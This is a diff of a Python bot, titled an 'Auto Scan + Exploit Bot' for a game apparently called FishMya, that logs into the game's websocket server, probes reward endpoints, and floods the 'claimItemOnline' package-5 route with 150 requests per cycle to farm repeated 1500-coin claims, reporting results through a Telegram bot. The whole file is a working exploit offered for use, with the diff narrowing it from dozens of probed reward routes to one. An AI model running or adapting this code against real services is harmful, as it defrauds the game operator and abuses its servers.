@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-FishMya Game - Auto Scan + Exploit Bot (Fast Preset)
+FishMya Game - Auto Scan + Exploit Bot (Pkg 5 Only, 150 req/cycle)
 Author: GHOST
-Version: 18.6 - Fast Rate
+Version: 19.0 - Pkg 5 Targeted
 """
 
 import asyncio
@@ -31,12 +31,15 @@ WS_HEADERS = [
     "X-Requested-With: com.mytel.myid"
 ]
 
-# ==================== RATE CONTROL (FAST) ====================
-REQUESTS_PER_CYCLE = 5       # တစ်ခါ ၅ ခု ပို့
-SLEEP_BETWEEN_CYCLES = 0.01  # ၁၀ms စောင့်
+# ==================== RATE CONTROL ====================
+REQUESTS_PER_CYCLE = 150     # တစ်ခါ ၁၅၀ ခု ပို့ (Pkg 5 ကို ပဲ)
+SLEEP_BETWEEN_CYCLES = 0.5   # ၅၀၀ms စောင့် (≈300 req/s)
 PING_INTERVAL = 5            # ၅ စက္ကန့်တစ်ခါ ping
-RECV_TIMEOUT = 0.02          # recv timeout 20ms
-RECV_WINDOW = 0.05           # recv window 50ms
+RECV_TIMEOUT = 0.05          # recv timeout 50ms
+RECV_WINDOW = 0.3            # recv window 300ms
+
+# ==================== TARGET ROUTE (Pkg 5 only) ====================
+TARGET_ROUTE = {"route": "claimItemOnline", "data": {"package": 5}, "desc": "Pkg 5", "coins": 1500}
 
 # ==================== LOGGING ====================
 logging.basicConfig(
@@ -51,72 +54,9 @@ TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 last_update_id = 0
 owner_chat_id = None
 
-# ==================== SCAN ROUTES ====================
+# ==================== SCAN ROUTES (for verification only) ====================
 SCAN_ROUTES = [
-    {"route": "claimItemOnline", "data": {"package": 1}, "desc": "Pkg 1"},
-    {"route": "claimItemOnline", "data": {"package": 2}, "desc": "Pkg 2"},
-    {"route": "claimItemOnline", "data": {"package": 3}, "desc": "Pkg 3"},
-    {"route": "claimItemOnline", "data": {"package": 4}, "desc": "Pkg 4"},
     {"route": "claimItemOnline", "data": {"package": 5}, "desc": "Pkg 5"},
-    {"route": "claimItemOnline", "data": {"package": 6}, "desc": "Pkg 6"},
-    {"route": "claimItemOnline", "data": {"package": 7}, "desc": "Pkg 7"},
-    {"route": "claimItemOnline", "data": {"package": 8}, "desc": "Pkg 8"},
-    {"route": "claimItemOnline", "data": {"package": 9}, "desc": "Pkg 9"},
-    {"route": "claimItemOnline", "data": {"package": 10}, "desc": "Pkg 10"},
-    {"route": "claimDaily", "data": {}, "desc": "Daily"},
-    {"route": "claimDailyReward", "data": {}, "desc": "Daily Reward"},
-    {"route": "dailyClaim", "data": {}, "desc": "Daily Claim"},
-    {"route": "claimLogin", "data": {}, "desc": "Login"},
-    {"route": "loginReward", "data": {}, "desc": "Login Reward"},
-    {"route": "dailyBonus", "data": {}, "desc": "Daily Bonus"},
-    {"route": "checkin", "data": {}, "desc": "Check-in"},
-    {"route": "dailyCheckin", "data": {}, "desc": "Daily Check-in"},
-    {"route": "claimGift", "data": {}, "desc": "Gift"},
-    {"route": "openGift", "data": {}, "desc": "Open Gift"},
-    {"route": "receiveGift", "data": {}, "desc": "Receive Gift"},
-    {"route": "giftBox", "data": {}, "desc": "Gift Box"},
-    {"route": "openBox", "data": {}, "desc": "Open Box"},
-    {"route": "claimBox", "data": {}, "desc": "Claim Box"},
-    {"route": "claimReward", "data": {}, "desc": "Claim Reward"},
-    {"route": "getReward", "data": {}, "desc": "Get Reward"},
-    {"route": "receiveReward", "data": {}, "desc": "Receive Reward"},
-    {"route": "claimBonus", "data": {}, "desc": "Claim Bonus"},
-    {"route": "getBonus", "data": {}, "desc": "Get Bonus"},
-    {"route": "bonusReward", "data": {}, "desc": "Bonus Reward"},
-    {"route": "claimItem", "data": {}, "desc": "Claim Item"},
-    {"route": "useItem", "data": {"type": 1}, "desc": "Use Item 1"},
-    {"route": "useItem", "data": {"type": 2}, "desc": "Use Item 2"},
-    {"route": "useItem", "data": {"type": 3}, "desc": "Use Item 3"},
-    {"route": "useItem", "data": {"type": 4}, "desc": "Use Item 4"},
-    {"route": "useItem", "data": {"type": 5}, "desc": "Use Item 5"},
-    {"route": "useItem", "data": {"type": 6}, "desc": "Use Item 6"},
-    {"route": "claimMission", "data": {}, "desc": "Mission"},
-    {"route": "missionReward", "data": {}, "desc": "Mission Reward"},
-    {"route": "completeMission", "data": {}, "desc": "Complete Mission"},
-    {"route": "taskReward", "data": {}, "desc": "Task Reward"},
-    {"route": "claimTask", "data": {}, "desc": "Claim Task"},
-    {"route": "questReward", "data": {}, "desc": "Quest Reward"},
-    {"route": "levelReward", "data": {}, "desc": "Level Reward"},
-    {"route": "levelUpReward", "data": {}, "desc": "Level Up"},
-    {"route": "claimLevel", "data": {}, "desc": "Claim Level"},
-    {"route": "eventReward", "data": {}, "desc": "Event Reward"},
-    {"route": "claimEvent", "data": {}, "desc": "Claim Event"},
-    {"route": "eventBonus", "data": {}, "desc": "Event Bonus"},
-    {"route": "onlineReward", "data": {}, "desc": "Online Reward"},
-    {"route": "onlineBonus", "data": {}, "desc": "Online Bonus"},
-    {"route": "timeReward", "data": {}, "desc": "Time Reward"},
-    {"route": "hourlyReward", "data": {}, "desc": "Hourly Reward"},
-    {"route": "catchFish", "data": {}, "desc": "Catch Fish"},
-    {"route": "fishReward", "data": {}, "desc": "Fish Reward"},
-    {"route": "claimFish", "data": {}, "desc": "Claim Fish"},
-    {"route": "exchange", "data": {}, "desc": "Exchange"},
-    {"route": "exchangeItem", "data": {}, "desc": "Exchange Item"},
-    {"route": "convert", "data": {}, "desc": "Convert"},
-    {"route": "getBalance", "data": {}, "desc": "Get Balance"},
-    {"route": "refreshCash", "data": {}, "desc": "Refresh Cash"},
-    {"route": "syncCash", "data": {}, "desc": "Sync Cash"},
-    {"route": "updateCash", "data": {}, "desc": "Update Cash"},
-    {"route": "reloadCash", "data": {}, "desc": "Reload Cash"},
 ]
 
 # ==================== STATE ====================
@@ -266,14 +206,14 @@ def connect_and_login():
         logger.error(f"Connection error: {e}")
         return None, None
 
-# ==================== TEST BEST ROUTE ====================
-def test_best_route_performance(ws, best_route):
-    if not ws or not ws.connected or not best_route:
+# ==================== TEST PKG 5 ====================
+def test_pkg5(ws):
+    """Test Pkg 5 with 50 requests and verify 1500 coins per claim"""
+    if not ws or not ws.connected:
         return None
-    logger.info(f"🧪 Testing best route: {best_route['desc']} with 50 requests...")
-    route_name = best_route['route']
-    route_data = best_route['data']
-    desc = best_route['desc']
+    logger.info("🧪 Testing Pkg 5 with 50 requests...")
+    route_name = TARGET_ROUTE['route']
+    route_data = TARGET_ROUTE['data']
     total_coins = 0
     successful_requests = 0
     start_time = time.time()
@@ -288,7 +228,7 @@ def test_best_route_performance(ws, best_route):
             msg_id += 1
         except:
             break
-        time.sleep(0.02)
+        time.sleep(0.01)
     ws.settimeout(0.5)
     response_end_time = time.time() + 3
     while time.time() < response_end_time:
@@ -308,21 +248,22 @@ def test_best_route_performance(ws, best_route):
         elapsed_time = 0.1
     coins_per_second = int(total_coins / elapsed_time) if total_coins > 0 else 0
     requests_per_second = int(successful_requests / elapsed_time) if successful_requests > 0 else 0
+    avg_per_claim = int(total_coins / successful_requests) if successful_requests > 0 else 0
     result = {
-        'route': desc,
+        'route': "Pkg 5",
         'total_requests': 50,
         'successful': successful_requests,
         'total_coins': total_coins,
         'elapsed_time': round(elapsed_time, 2),
         'coins_per_second': coins_per_second,
         'requests_per_second': requests_per_second,
-        'avg_coins_per_request': int(total_coins / successful_requests) if successful_requests > 0 else 0
+        'avg_coins_per_request': avg_per_claim
     }
     bot_state['rps_test_result'] = result
-    logger.info(f"📊 Test Result: {desc} → {total_coins} coins, {coins_per_second} coins/s, {requests_per_second} rps")
+    logger.info(f"📊 Pkg 5 Test → {total_coins} coins, {coins_per_second} coins/s, avg {avg_per_claim}/claim")
     return result
 
-# ==================== SCAN ====================
+# ==================== SCAN (only Pkg 5) ====================
 def scan_routes():
     global bot_state
     bot_state['scanning'] = True
@@ -348,11 +289,10 @@ def scan_routes():
     }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
     time.sleep(1)
 
+    logger.info("🔍 Verifying Pkg 5...")
     msg_id = 1000
     found = []
-    scan_stats = {}
 
-    logger.info("🔍 Scanning individual routes...")
     for route_info in SCAN_ROUTES:
         route_name = route_info['route']
         route_data = route_info['data']
@@ -414,60 +354,44 @@ def scan_routes():
             msg_id += 1
             repeatable = repeat_coins > 0
 
-        scan_stats[desc] = {
-            'coins': coins_found,
-            'repeatable': repeatable,
-            'route': route_name,
-            'data': route_data
-        }
+        logger.info(f"📊 {desc}: {coins_found} coins (Repeat: {repeatable})")
+        if coins_found > 0 and repeatable:
+            found.append({'route': route_name, 'data': route_data, 'desc': desc,
+                          'coins': coins_found, 'repeatable': True})
+        time.sleep(0.1)
 
-        if coins_found > 0:
-            logger.info(f"📊 {desc}: {coins_found} coins (Repeat: {repeatable})")
-            if repeatable:
-                found.append({'route': route_name, 'data': route_data, 'desc': desc,
-                              'coins': coins_found, 'repeatable': True})
-
-        time.sleep(0.05)
-
-    best_route = max(found, key=lambda x: x['coins']) if found else None
-    test_result = None
-    if best_route:
-        bot_state['best_route'] = best_route
-        bot_state['best_route_coins'] = best_route['coins']
-        logger.info(f"🏆 Best route: {best_route['desc']} - {best_route['coins']} coins")
-        test_result = test_best_route_performance(ws, best_route)
+    if found:
+        bot_state['best_route'] = found[0]
+        bot_state['best_route_coins'] = found[0]['coins']
+        logger.info(f"🏆 Target confirmed: {found[0]['desc']} - {found[0]['coins']} coins")
+        test_result = test_pkg5(ws)
         if test_result:
             bot_state['max_requests_per_second'] = test_result['requests_per_second']
             bot_state['coins_per_second'] = test_result['coins_per_second']
-
-    total_all = sum(r['coins'] for r in found)
-    bot_state['total_coins_all'] = total_all
-    logger.info(f"📊 Total coins all routes: {total_all}")
 
     try:
         ws.close()
     except:
         pass
-    bot_state['found_routes'] = [r for r in found if r['repeatable']]
-    bot_state['scan_results'] = scan_stats
+    bot_state['found_routes'] = found
     bot_state['scanning'] = False
 
     if owner_chat_id:
-        summary = f"🔍 *Scan Complete!*\n\n"
-        summary += f"🏆 Best Route: {best_route['desc'] if best_route else 'None'} - {bot_state['best_route_coins']} coins\n"
-        summary += f"📊 Total All Routes: {total_all} coins\n"
-        summary += f"📦 Found Routes: {len(bot_state['found_routes'])}\n\n"
-        if test_result:
-            summary += f"🧪 *Test with 50 Requests:*\n"
-            summary += f"  • Coins/s: {test_result['coins_per_second']:,}\n"
-            summary += f"  • Requests/s: {test_result['requests_per_second']}\n"
-            summary += f"  • Time: {test_result['elapsed_time']}s\n"
-            summary += f"  • Total Coins: {test_result['total_coins']:,}\n"
+        summary = f"🔍 *Pkg 5 Verification*\n\n"
+        summary += f"💰 Coins per claim: {bot_state['best_route_coins']:,}\n"
+        summary += f"📦 Repeatable: {'✅' if found else '❌'}\n\n"
+        tr = bot_state.get('rps_test_result', {})
+        if tr:
+            summary += f"🧪 *Test 50 requests:*\n"
+            summary += f"  • Avg/claim: {tr.get('avg_coins_per_request', 0):,}\n"
+            summary += f"  • Coins/s: {tr.get('coins_per_second', 0):,}\n"
+            summary += f"  • Requests/s: {tr.get('requests_per_second', 0)}\n"
+            summary += f"  • Total: {tr.get('total_coins', 0):,}\n"
         asyncio.run(send_telegram(owner_chat_id, summary))
 
     return len(bot_state['found_routes']) > 0
 
-# ==================== EXPLOIT (FAST) ====================
+# ==================== EXPLOIT (Pkg 5, 150 req/cycle) ====================
 def exploit_loop():
     global bot_state
     if not bot_state['found_routes']:
@@ -480,20 +404,15 @@ def exploit_loop():
     bot_state['errors'] = 0
     bot_state['auto_restart_count'] = 0
     bot_state['start_time'] = datetime.now()
-    bot_state['route_stats'] = {}
-
-    for r in bot_state['found_routes']:
-        bot_state['route_stats'][r['desc']] = {'sent': 0, 'received': 0, 'coins': 0}
-
-    best_route = bot_state['best_route']
+    bot_state['route_stats'] = {'Pkg 5': {'sent': 0, 'received': 0, 'coins': 0}}
 
     if owner_chat_id:
         exploit_msg = (
-            f"⚡ *Exploit Started!* (FAST)\n\n"
-            f"🏆 Best Route: {best_route['desc'] if best_route else 'None'} ({bot_state['best_route_coins']} coins)\n"
-            f"📦 Using: {len(bot_state['found_routes'])} routes\n"
-            f"⏱️ Rate: {REQUESTS_PER_CYCLE} req / {int(SLEEP_BETWEEN_CYCLES*1000)}ms\n\n"
-            f"💡 Use *Status* button to check progress."
+            f"⚡ *Pkg 5 Exploit Started!*\n\n"
+            f"🎯 Target: Pkg 5 ({TARGET_ROUTE['coins']:,} coins/claim)\n"
+            f"⏱️ Rate: {REQUESTS_PER_CYCLE} req / {SLEEP_BETWEEN_CYCLES}s\n"
+            f"📊 Expected: ~{int(REQUESTS_PER_CYCLE * TARGET_ROUTE['coins'] / SLEEP_BETWEEN_CYCLES):,} coins/s\n\n"
+            f"💡 Use *Status* button."
         )
         asyncio.run(send_telegram(owner_chat_id, exploit_msg, get_main_keyboard()))
 
@@ -515,7 +434,6 @@ def exploit_loop():
         bot_state['connected'] = True
         bot_state['current_balance'] = login_data.get("cash", bot_state['current_balance'])
 
-        # enter room
         try:
             ws.send(msgpack.packb({
                 "route": "play",
@@ -548,31 +466,33 @@ def exploit_loop():
                     except:
                         pass
 
-                # ---- Send batch ----
+                # ---- Send 150 Pkg 5 requests ----
+                send_ok = True
                 for _ in range(REQUESTS_PER_CYCLE):
                     if not bot_state['is_running']:
                         break
-                    if best_route:
-                        try:
-                            ws.send(msgpack.packb({
-                                "route": best_route['route'],
-                                "data": best_route['data'],
-                                "msgId": msg_id
-                            }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-                        except Exception as e:
-                            logger.error(f"Send error: {e}")
-                            connection_broken = True
-                            break
-                        request_count += 1
-                        msg_id += 1
-                        with state_lock:
-                            bot_state['route_stats'][best_route['desc']]['sent'] += 1
-                            bot_state['claims_done'] += 1
+                    try:
+                        ws.send(msgpack.packb({
+                            "route": TARGET_ROUTE['route'],
+                            "data": TARGET_ROUTE['data'],
+                            "msgId": msg_id
+                        }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
+                    except Exception as e:
+                        logger.error(f"Send error: {e}")
+                        connection_broken = True
+                        send_ok = False
+                        break
+                    request_count += 1
+                    msg_id += 1
 
-                if connection_broken:
+                if not send_ok or connection_broken:
                     break
 
-                # ---- Receive window (FAST) ----
+                with state_lock:
+                    bot_state['route_stats']['Pkg 5']['sent'] += REQUESTS_PER_CYCLE
+                    bot_state['claims_done'] += REQUESTS_PER_CYCLE
+
+                # ---- Receive window ----
                 ws.settimeout(RECV_TIMEOUT)
                 recv_end = time.time() + RECV_WINDOW
                 while time.time() < recv_end:
@@ -591,12 +511,8 @@ def exploit_loop():
                                     bot_state['current_balance'] = inner.get("newCash", bot_state['current_balance'])
                                     coins_in_interval += change
                                     last_coin_time = time.time()
-                                for ri in bot_state['found_routes']:
-                                    if abs(change - ri['coins']) <= 50:
-                                        with state_lock:
-                                            bot_state['route_stats'][ri['desc']]['received'] += 1
-                                            bot_state['route_stats'][ri['desc']]['coins'] += change
-                                        break
+                                    bot_state['route_stats']['Pkg 5']['received'] += 1
+                                    bot_state['route_stats']['Pkg 5']['coins'] += change
                     except websocket.WebSocketTimeoutException:
                         break
                     except ssl.SSLError as e:
@@ -652,15 +568,15 @@ def exploit_loop():
 def auto_main_loop():
     while True:
         try:
-            logger.info("🔄 Starting scan...")
+            logger.info("🔄 Verifying Pkg 5...")
             success = scan_routes()
             if success:
-                logger.info("✅ Scan found routes. Cooling down 5s before exploit...")
+                logger.info("✅ Pkg 5 confirmed. Cooling down 5s...")
                 time.sleep(5)
                 logger.info("⚡ Starting exploit...")
                 exploit_loop()
             else:
-                logger.warning("❌ Scan found no routes, restarting in 10s...")
+                logger.warning("❌ Pkg 5 not working, retry in 10s...")
                 time.sleep(10)
         except Exception as e:
             logger.error(f"Auto loop error: {e}")
@@ -673,11 +589,10 @@ async def process_command(chat_id: str, text: str):
     if text.startswith('/start'):
         if owner_chat_id is None:
             owner_chat_id = chat_id
-        best = bot_state.get('best_route')
-        best_desc = best.get('desc') if isinstance(best, dict) else 'None'
         status_text = (
-            "🤖 *Auto FishMya Bot* (FAST)\n\n"
-            f"🏆 Best Route: {best_desc}\n"
+            "🤖 *FishMya Pkg 5 Bot*\n\n"
+            f"🎯 Target: Pkg 5 ({TARGET_ROUTE['coins']:,} coins/claim)\n"
+            f"⏱️ Rate: {REQUESTS_PER_CYCLE} req / {SLEEP_BETWEEN_CYCLES}s\n"
             f"💰 Balance: {bot_state.get('current_balance', 0):,}\n"
             f"📈 Gained: +{bot_state.get('total_claimed', 0):,}\n"
             f"📊 CPS: {int(bot_state.get('coins_per_second', 0)):,}\n"
@@ -694,7 +609,7 @@ async def process_command(chat_id: str, text: str):
         text_msg = (
             f"📊 *Status*\n\n"
             f"State: {status}\n"
-            f"Routes: {len(bot_state['found_routes'])}\n"
+            f"🎯 Target: Pkg 5\n"
             f"Claims: {bot_state['claims_done']:,}\n"
             f"💰 Balance: {bot_state['current_balance']:,}\n"
             f"📈 Gained: +{bot_state['total_claimed']:,}\n"
@@ -707,23 +622,21 @@ async def process_command(chat_id: str, text: str):
     elif text in ['/balance']:
         await send_telegram(chat_id, f"💰 Balance: {bot_state['current_balance']:,}\n📈 Gained: +{bot_state['total_claimed']:,}")
     elif text in ['/stats']:
-        best = bot_state.get('best_route')
-        best_desc = best.get('desc') if isinstance(best, dict) else 'None'
         stats_text = "📊 *Detailed Stats*\n\n"
-        stats_text += f"🏆 Best Route: {best_desc} - {bot_state.get('best_route_coins', 0)} coins\n"
-        stats_text += f"📊 Total All Routes: {bot_state.get('total_coins_all', 0)} coins\n"
-        stats_text += f"🚀 Max RPS: {bot_state.get('max_requests_per_second', 0)}\n"
+        stats_text += f"🎯 Target: Pkg 5 ({TARGET_ROUTE['coins']:,}/claim)\n"
+        stats_text += f"⏱️ Rate: {REQUESTS_PER_CYCLE} req / {SLEEP_BETWEEN_CYCLES}s\n"
         stats_text += f"📈 Current CPS: {int(bot_state.get('coins_per_second', 0)):,}\n"
-        test_result = bot_state.get('rps_test_result', {}) or {}
-        if test_result:
-            stats_text += "\n🧪 *Test Result:*\n"
-            stats_text += f"  • Coins/s: {test_result.get('coins_per_second', 0):,}\n"
-            stats_text += f"  • Requests/s: {test_result.get('requests_per_second', 0)}\n"
-            stats_text += f"  • Time: {test_result.get('elapsed_time', 0)}s\n"
-            stats_text += f"  • Total Coins: {test_result.get('total_coins', 0):,}\n"
+        stats_text += f"🚀 RPS: {int(bot_state.get('current_requests_per_second', 0))}\n"
+        tr = bot_state.get('rps_test_result', {}) or {}
+        if tr:
+            stats_text += "\n🧪 *Test 50 requests:*\n"
+            stats_text += f"  • Avg/claim: {tr.get('avg_coins_per_request', 0):,}\n"
+            stats_text += f"  • Coins/s: {tr.get('coins_per_second', 0):,}\n"
+            stats_text += f"  • Requests/s: {tr.get('requests_per_second', 0)}\n"
+            stats_text += f"  • Total: {tr.get('total_coins', 0):,}\n"
         stats_text += "\n📊 Route Stats:\n"
         for desc, s in (bot_state.get('route_stats', {}) or {}).items():
-            stats_text += f"  • {desc}: {s.get('coins', 0)} coins\n"
+            stats_text += f"  • {desc}: {s.get('coins', 0):,} coins ({s.get('sent', 0)} sent / {s.get('received', 0)} recv)\n"
         await send_telegram(chat_id, stats_text, get_main_keyboard())
 
 async def handle_callback(chat_id: str, data: str):
@@ -740,7 +653,7 @@ async def handle_callback(chat_id: str, data: str):
 # ==================== MAIN ====================
 async def main():
     global last_update_id, owner_chat_id
-    print("Starting auto FishMya bot (FAST)...")
+    print("Starting FishMya Pkg 5 Bot...")
     threading.Thread(target=auto_main_loop, daemon=True).start()
     while True:
         try:
